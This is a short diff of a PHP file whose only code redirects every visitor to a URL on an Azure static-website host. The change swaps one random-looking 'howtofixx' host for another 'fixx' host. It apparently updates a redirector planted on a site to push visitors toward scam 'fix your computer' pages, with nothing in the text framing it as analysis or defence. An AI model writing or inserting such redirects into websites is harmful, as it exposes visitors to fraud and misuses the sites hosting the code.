@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://howtofixx86782sdsd.z5.web.core.windows.net/");
+header("Location: https://chip41set86fixx768scores.z13.web.core.windows.net/");
  
 exit;
 ?>
